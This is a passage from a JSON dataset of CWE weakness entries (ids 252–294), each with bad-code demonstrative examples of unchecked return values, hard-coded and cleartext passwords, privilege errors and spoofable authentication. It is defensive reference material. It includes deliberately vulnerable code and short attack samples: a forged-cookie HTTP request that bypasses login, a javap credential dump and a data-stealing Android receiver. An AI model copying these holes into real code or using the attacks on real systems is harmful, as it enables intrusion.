need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in."
    },
    {
        "id": 252,
        "demonstrative_examples": "Example 1 Consider the following code segment: (bad code) Example Language: C char buf[10], cp_buf[10]; fgets(buf, 10, stdin); strcpy(cp_buf, buf); The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy(). Example 2 In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed: (bad code) Example Language: C int returnChunkSize(void *) { /* if chunk info is valid, return the size of usable memory, * else, return -1 to indicate an error */ ... } int main() { ... memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1)); ... } If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation ( CWE-252 ), so -1 can be passed as the size argument to memcpy() ( CWE-805 ). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 ( CWE-195 ), and therefore will copy far more memory than is likely available to the destination buffer ( CWE-787 , CWE-788 ). Example 3 The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc(). (bad code) Example Language: C buf = (char*) malloc(req_size); strncpy(buf, xfer, req_size); The traditional defense of this coding error is: \"If my program runs out of memory, it will fail. It doesn\\'t matter whether I handle the error or allow the program to die with a segmentation fault when it tries to dereference the null pointer.\" This argument ignores three important considerations: Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue. It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state. The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know. Example 4 The following examples read a file into a byte array. (bad code) Example Language: C# char[] byteArray = new char[1024]; for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) { String userName = (String) i.Current(); String pFileName = PFILE_ROOT + \"/\" + userName; StreamReader sr = new StreamReader(pFileName); sr.Read(byteArray,0,1024);//the file is always 1k bytes sr.Close(); processPFile(userName, byteArray); } (bad code) Example Language: Java FileInputStream fis; byte[] byteArray = new byte[1024]; for (Iterator i=users.iterator(); i.hasNext();) { String userName = (String) i.next(); String pFileName = PFILE_ROOT + \"/\" + userName; FileInputStream fis = new FileInputStream(pFileName); fis.read(byteArray); // the file is always 1k bytes fis.close(); processPFile(userName, byteArray); The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker. Example 5 The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference. (bad code) Example Language: Java String itemName = request.getParameter(ITEM_NAME); if (itemName.compareTo(IMPORTANT_ITEM) == 0) { ... } ... The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference. (bad code) Example Language: Java String itemName = request.Item(ITEM_NAME); if (itemName.Equals(IMPORTANT_ITEM)) { ... } ... The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn\\'t matter whether I handle the error or allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved. Example 6 The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined. (bad code) Example Language: Java System.clearProperty(\"os.name\"); ... String os = System.getProperty(\"os.name\"); if (os.equalsIgnoreCase(\"Windows 95\")) System.out.println(\"Not supported\"); The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn\\'t matter whether I handle the error or allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved. Example 7 The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value. (bad code) Example Language: C# Dim MyFile As New FileStream(\"myfile.txt\", FileMode.Open, FileAccess.Read, FileShare.Read) Dim MyArray(50) As Byte MyFile.Read(MyArray, 0, 50) DoDangerousOperation(MyArray(20)) In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested. Example 8 It is not uncommon for Java programmers to misunderstand read() and related methods that are part of many java.io classes. Most errors and unusual events in Java result in an exception being thrown. But the stream and reader classes do not consider it unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested. This behavior makes it important for programmers to examine the return value from read() and other IO methods to ensure that they receive the amount of data they expect. Example 9 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr ( CWE-252 ), a NULL pointer dereference ( CWE-476 ) would then occur in the call to strcpy(). Note that this code is also vulnerable to a buffer overflow ( CWE-119 ). Example 10 The following function attempts to acquire a lock in order to perform operations on a shared resource. (bad code) Example Language: C void f(pthread_mutex_t *mutex) { pthread_mutex_lock(mutex); /* access shared resource */ pthread_mutex_unlock(mutex); } However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior. In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels. (good code) Example Language: C int f(pthread_mutex_t *mutex) { int result; result = pthread_mutex_lock(mutex); if (0 != result) return result; /* access shared resource */ return pthread_mutex_unlock(mutex); }"
    },
    {
        "id": 253,
        "demonstrative_examples": "Example 1 This code attempts to allocate memory for 4 integers and checks if the allocation succeeds. (bad code) Example Language: C tmp = malloc(sizeof(int) * 4); if (tmp < 0 ) { perror(\"Failure\"); //should have checked if the call returned 0 } The code assumes that only a negative return value would indicate an error, but malloc() may return a null pointer when there is an error. The value of tmp could then be equal to 0, and the error would be missed."
    },
    {
        "id": 256,
        "demonstrative_examples": "Example 1 The following code reads a password from a properties file and uses the password to connect to a database. (bad code) Example Language: Java ... Properties prop = new Properties(); prop.load(new FileInputStream(\"config.properties\")); String password = prop.getProperty(\"password\"); DriverManager.getConnection(url, usr, password); ... This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system. Example 2 The following code reads a password from the registry and uses the password to create a new network credential. (bad code) Example Language: Java ... String password = regKey.GetValue(passKey).toString(); NetworkCredential netCred = new NetworkCredential(username,password,domain); ... This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system Example 3 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 257,
        "demonstrative_examples": "Example 1 Both of these examples verify a password by comparing it to a stored compressed version. (bad code) Example Language: C int VerifyAdmin(char *password) { if (strcmp(compress(password), compressed_password)) { printf(\"Incorrect Password!\\\\n\"); return(0); } printf(\"Entering Diagnostic Mode...\\\\n\"); return(1); } (bad code) Example Language: Java int VerifyAdmin(String password) { if (passwd.Equals(compress(password), compressed_password)) { return(0); } //Diagnostic Mode return(1); } Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database. Example 2 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 258,
        "demonstrative_examples": "Example 1 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but the password is provided as an empty string. This Java example shows a properties file with an empty password string. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password= ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database and the password is provided as an empty string. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... An empty string should never be used as a password as this can allow unauthorized access to the application. Username and password information should not be included in a configuration file or a properties file in clear text. If possible, encrypt this information and avoid CWE-260 and CWE-13 ."
    },
    {
        "id": 259,
        "demonstrative_examples": "Example 1 The following code uses a hard-coded password to connect to a database: (bad code) Example Language: Java ... DriverManager.getConnection(url, \"scott\", \"tiger\"); ... This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user \"scott\" with a password of \"tiger\" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above: (attack code) javap -c ConnMngr.class 22: ldc #36; //String jdbc:mysql://ixne.com/rxsql 24: ldc #38; //String scott 26: ldc #17; //String tiger Example 2 The following code is an example of an internal hard-coded password in the back-end: (bad code) Example Language: C int VerifyAdmin(char *password) { if (strcmp(password, \"Mew!\")) { printf(\"Incorrect Password!\\\\n\"); return(0) } printf(\"Entering Diagnostic Mode...\\\\n\"); return(1); } (bad code) Example Language: Java int VerifyAdmin(String password) { if (!password.equals(\"Mew!\")) { return(0) } //Diagnostic Mode return(1); } Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this \"functionality.\" Example 3 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 260,
        "demonstrative_examples": "Example 1 Below is a snippet from a Java properties file. (bad code) Example Language: Java webapp.ldap.username = secretUsername webapp.ldap.password = secretPassword Because the LDAP credentials are stored in plaintext, anyone with access to the file can gain access to the resource. Example 2 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 261,
        "demonstrative_examples": "Example 1 The following code reads a password from a properties file and uses the password to connect to a database. (bad code) Example Language: Java ... Properties prop = new Properties(); prop.load(new FileInputStream(\"config.properties\")); String password = Base64.decode(prop.getProperty(\"password\")); DriverManager.getConnection(url, usr, password); ... This code will run successfully, but anyone with access to config.properties can read the value of password and easily determine that the value has been base 64 encoded. If a devious employee has access to this information, they can use it to break into the system. Example 2 The following code reads a password from the registry and uses the password to create a new network credential. (bad code) Example Language: C# ... string value = regKey.GetValue(passKey).ToString(); byte[] decVal = Convert.FromBase64String(value); NetworkCredential netCred = newNetworkCredential(username,decVal.toString(),domain); ... This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system."
    },
    {
        "id": 262,
        "demonstrative_examples": "Example 1 A system does not enforce the changing of passwords every certain period."
    },
    {
        "id": 263,
        "demonstrative_examples": "Example 1 A system requires the changing of passwords every five years."
    },
    {
        "id": 266,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C seteuid(0); /* do some stuff */ seteuid(getuid()); Example 2 The following example demonstrates the weakness. (bad code) Example Language: Java AccessController.doPrivileged(new PrivilegedAction() { public Object run() { // privileged code goes here, for example: System.loadLibrary(\"awt\"); return null; // nothing to return } Example 3 This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes. (bad code) Example Language: Java Intent intent = new Intent(); intent.setAction(\"com.example.BackupUserData\"); intent.setData(file_uri); intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION); sendBroadcast(intent); (attack code) Example Language: Java public class CallReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { Uri userData = intent.getData(); stealUserData(userData); } } \"Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.\""
    },
    {
        "id": 267,
        "demonstrative_examples": "Example 1 This code intends to allow only Administrators to print debug information about a system. (bad code) Example Language: Java public enum Roles { ADMIN,USER,GUEST } public void printDebugInfo(User requestingUser){ if(isAuthenticated(requestingUser)){ switch(requestingUser.role){ case GUEST: System.out.println(\"You are not authorized to perform this command\"); break; default: System.out.println(currentDebugState()); break; } } else{ System.out.println(\"You must be logged in to perform this command\"); } } While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of \"GUEST\". Someone with the role of \"ADMIN\" or \"USER\" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system."
    },
    {
        "id": 268,
        "demonstrative_examples": "Example 1 This code allows someone with the role of \"ADMIN\" or \"OPERATOR\" to reset a user\\'s password. The role of \"OPERATOR\" is intended to have less privileges than an \"ADMIN\", but still be able to help users with small issues such as forgotten passwords. (bad code) Example Language: Java public enum Roles { ADMIN,OPERATOR,USER,GUEST } public void resetPassword(User requestingUser, User user, String password ){ if(isAuthenticated(requestingUser)){ switch(requestingUser.role){ case GUEST: System.out.println(\"You are not authorized to perform this command\"); break; case USER: System.out.println(\"You are not authorized to perform this command\"); break; default: setPassword(user,password); break; } } else{ System.out.println(\"You must be logged in to perform this command\"); } } This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account."
    },
    {
        "id": 269,
        "demonstrative_examples": "Example 1 \"This code temporarily raises the program's privileges to allow creation of a new user folder.\" (bad code) Example Language: Python def makeNewUserDir(username): if invalidUsername(username): #avoid CWE-22 and CWE-78 \"print('Usernames cannot contain invalid characters')\" return False try: raisePrivileges() \"os.mkdir('/home/' + username)\" lowerPrivileges() except OSError: \"print('Unable to create new user directory for user:' + username)\" return False return True While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur. Example 2 The following example demonstrates the weakness. (bad code) Example Language: C seteuid(0); /* do some stuff */ seteuid(getuid()); Example 3 The following example demonstrates the weakness. (bad code) Example Language: Java AccessController.doPrivileged(new PrivilegedAction() { public Object run() { // privileged code goes here, for example: System.loadLibrary(\"awt\"); return null; // nothing to return } Example 4 This code intends to allow only Administrators to print debug information about a system. (bad code) Example Language: Java public enum Roles { ADMIN,USER,GUEST } public void printDebugInfo(User requestingUser){ if(isAuthenticated(requestingUser)){ switch(requestingUser.role){ case GUEST: System.out.println(\"You are not authorized to perform this command\"); break; default: System.out.println(currentDebugState()); break; } } else{ System.out.println(\"You must be logged in to perform this command\"); } } While the intention was to only allow Administrators to print the debug information, the code as written only excludes those with the role of \"GUEST\". Someone with the role of \"ADMIN\" or \"USER\" will be allowed access, which goes against the original intent. An attacker may be able to use this debug information to craft an attack on the system. Example 5 This code allows someone with the role of \"ADMIN\" or \"OPERATOR\" to reset a user\\'s password. The role of \"OPERATOR\" is intended to have less privileges than an \"ADMIN\", but still be able to help users with small issues such as forgotten passwords. (bad code) Example Language: Java public enum Roles { ADMIN,OPERATOR,USER,GUEST } public void resetPassword(User requestingUser, User user, String password ){ if(isAuthenticated(requestingUser)){ switch(requestingUser.role){ case GUEST: System.out.println(\"You are not authorized to perform this command\"); break; case USER: System.out.println(\"You are not authorized to perform this command\"); break; default: setPassword(user,password); break; } } else{ System.out.println(\"You must be logged in to perform this command\"); } } This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account."
    },
    {
        "id": 270,
        "demonstrative_examples": ""
    },
    {
        "id": 271,
        "demonstrative_examples": "Example 1 The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file. (bad code) Example Language: C chroot(APP_HOME); chdir(\"/\"); FILE* data = fopen(argv[1], \"r+\"); ... \"Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.\""
    },
    {
        "id": 272,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C setuid(0); // Do some important stuff setuid(old_uid); // Do some non privileged stuff. Example 2 The following example demonstrates the weakness. (bad code) Example Language: Java AccessController.doPrivileged(new PrivilegedAction() { public Object run() { // privileged code goes here, for example: System.loadLibrary(\"awt\"); return null; // nothing to return } Example 3 The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file. (bad code) Example Language: C chroot(APP_HOME); chdir(\"/\"); FILE* data = fopen(argv[1], \"r+\"); ... \"Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.\""
    },
    {
        "id": 273,
        "demonstrative_examples": "Example 1 This code attempts to take on the privileges of a user before creating a file, thus avoiding performing the action with unnecessarily high privileges: (bad code) Example Language: C++ bool DoSecureStuff(HANDLE hPipe) { bool fDataWritten = false; ImpersonateNamedPipeClient(hPipe); HANDLE hFile = CreateFile(...); /../ RevertToSelf() /../ } The call to ImpersonateNamedPipeClient may fail, but the return value is not checked. If the call fails, the code may execute with higher privileges than intended. In this case, an attacker could exploit this behavior to write a file to a location that the attacker does not have access to."
    },
    {
        "id": 274,
        "demonstrative_examples": ""
    },
    {
        "id": 276,
        "demonstrative_examples": ""
    },
    {
        "id": 277,
        "demonstrative_examples": ""
    },
    {
        "id": 278,
        "demonstrative_examples": ""
    },
    {
        "id": 279,
        "demonstrative_examples": ""
    },
    {
        "id": 280,
        "demonstrative_examples": ""
    },
    {
        "id": 281,
        "demonstrative_examples": ""
    },
    {
        "id": 282,
        "demonstrative_examples": ""
    },
    {
        "id": 283,
        "demonstrative_examples": "Example 1 This function is part of a privileged program that takes input from users with potentially lower privileges. (bad code) Example Language: Python def killProcess(processID): os.kill(processID, signal.SIGKILL) This code does not confirm that the process to be killed is owned by the requesting user, thus allowing an attacker to kill arbitrary processes. This function remedies the problem by checking the owner of the process before killing it: (good code) Example Language: Python def killProcess(processID): user = getCurrentUser() #Check process owner against requesting user if getProcessOwner(processID) == user: os.kill(processID, signal.SIGKILL) return else: print(\"You cannot kill a process you don\\'t own\") return"
    },
    {
        "id": 284,
        "demonstrative_examples": ""
    },
    {
        "id": 285,
        "demonstrative_examples": "Example 1 This function runs an arbitrary SQL query on a given database, returning the result of the query. (bad code) Example Language: PHP function runEmployeeQuery($dbName, $name){ mysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName); //Use a prepared statement to avoid CWE-89 \"$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');\" \"$preparedStatement->execute(array(':name' => $name));\" return $preparedStatement->fetchAll(); } /.../ \"$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);\" While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database. Example 2 The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory. (bad code) Example Language: Perl sub DisplayPrivateMessage { my($id) = @_; my $Message = LookupMessageObject($id); print \"From: \" . encodeHTML($Message->{from}) . \"<br>\\\\n\"; print \"Subject: \" . encodeHTML($Message->{subject}) . \"\\\\n\"; print \"<hr>\\\\n\"; print \"Body: \" . encodeHTML($Message->{body}) . \"\\\\n\"; } my $q = new CGI; # For purposes of this example, assume that CWE-309 and # CWE-523 do not apply. \"if (! AuthenticateUser($q->param('username'), $q->param('password'))) {\" ExitError(\"invalid username or password\"); } \"my $id = $q->param('id');\" DisplayPrivateMessage($id); While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users. One way to avoid this problem would be to ensure that the \"to\" field in the message object matches the username of the authenticated user."
    },
    {
        "id": 286,
        "demonstrative_examples": ""
    },
    {
        "id": 287,
        "demonstrative_examples": "Example 1 The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to \"remember\" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the \"Administrator\" username, as recorded in the user cookie. (bad code) Example Language: Perl my $q = new CGI; if ($q->cookie(\\'loggedin\\') ne \"true\") { \"if (! AuthenticateUser($q->param('username'), $q->param('password'))) {\" ExitError(\"Error: you need to log in first\"); } else { # Set loggedin and user cookies. $q->cookie( \"-name => 'loggedin',\" \"-value => 'true'\" ); $q->cookie( \"-name => 'user',\" \"-value => $q->param('username')\" ); } } if ($q->cookie(\\'user\\') eq \"Administrator\") { DoAdministratorTasks(); } Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as: (attack code) GET /cgi-bin/vulnerable.cgi HTTP/1.1 Cookie: user=Administrator Cookie: loggedin=true [body of request] By setting the loggedin cookie to \"true\", the attacker bypasses the entire authentication check. By using the \"Administrator\" value in the user cookie, the attacker also gains privileges to administer the software. Example 2 \"In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.\" Example 2 References: [REF-236] Kim Zetter. \"Weak Password Brings \\'Happiness\\' to Twitter Hacker\". 2009-01-09. \\n\\t\\t\\t\\t< http://www.wired.com/threatlevel/2009/01/professed-twitt/ >."
    },
    {
        "id": 288,
        "demonstrative_examples": ""
    },
    {
        "id": 289,
        "demonstrative_examples": ""
    },
    {
        "id": 290,
        "demonstrative_examples": "Example 1 The following code authenticates users. (bad code) Example Language: Java String sourceIP = request.getRemoteAddr(); if (sourceIP != null && sourceIP.equals(APPROVED_IP)) { authenticated = true; } The authentication mechanism implemented relies on an IP address for source validation. If an attacker is able to spoof the IP, they may be able to bypass the authentication mechanism. Example 2 Both of these examples check if a request is from a trusted address before responding to the request. (bad code) Example Language: C sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET; serv.sin_addr.s_addr = htonl(INADDR_ANY); servr.sin_port = htons(1008); bind(sd, (struct sockaddr *) & serv, sizeof(serv)); while (1) { memset(msg, 0x0, MAX_MSG); clilen = sizeof(cli); if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) { n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen); } } (bad code) Example Language: Java while(true) { DatagramPacket rp=new DatagramPacket(rData,rData.length); outSock.receive(rp); String in = new String(p.getData(),0, rp.getLength()); InetAddress clientIPAddress = rp.getAddress(); int port = rp.getPort(); if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) { out = secret.getBytes(); DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp); } } The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client. Example 3 The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status. (bad code) Example Language: C struct hostent *hp;struct in_addr myaddr; char* tHost = \"trustme.example.com\"; myaddr.s_addr=inet_addr(ip_addr_string); hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET); if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) { trusted = true; } else { trusted = false; } (bad code) Example Language: Java String ip = request.getRemoteAddr(); InetAddress addr = InetAddress.getByName(ip); if (addr.getCanonicalHostName().endsWith(\"trustme.com\")) { trusted = true; } (bad code) Example Language: C# IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress); IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress); if (hostInfo.HostName.EndsWith(\"trustme.com\")) { trusted = true; } IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."
    },
    {
        "id": 291,
        "demonstrative_examples": "Example 1 Both of these examples check if a request is from a trusted address before responding to the request. (bad code) Example Language: C sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET; serv.sin_addr.s_addr = htonl(INADDR_ANY); servr.sin_port = htons(1008); bind(sd, (struct sockaddr *) & serv, sizeof(serv)); while (1) { memset(msg, 0x0, MAX_MSG); clilen = sizeof(cli); if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) { n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen); } } (bad code) Example Language: Java while(true) { DatagramPacket rp=new DatagramPacket(rData,rData.length); outSock.receive(rp); String in = new String(p.getData(),0, rp.getLength()); InetAddress clientIPAddress = rp.getAddress(); int port = rp.getPort(); if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) { out = secret.getBytes(); DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp); } } The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client."
    },
    {
        "id": 293,
        "demonstrative_examples": "Example 1 \"The following code samples check a packet's referer in order to decide whether or not an inbound request is from a trusted host.\" (bad code) Example Language: C++ String trustedReferer = \"http://www.example.com/\" while(true){ n = read(newsock, buffer, BUFSIZE); requestPacket = processPacket(buffer, n); if (requestPacket.referer == trustedReferer){ openNewSecureSession(requestPacket); } } (bad code) Example Language: Java boolean processConnectionRequest(HttpServletRequest request){ String referer = request.getHeader(\"referer\") String trustedReferer = \"http://www.example.com/\" if(referer.equals(trustedReferer)){ openPrivilegedConnection(request); return true; } else{ sendPrivilegeError(request); return false; } } These examples check if a request is from a trusted referer before responding to a request, but the code only verifies the referer name as stored in the request packet. An attacker can spoof the referer, thus impersonating a trusted client."
    },
    {
        "id": 294,
        "demonstrative_examples": ""
    },
    {
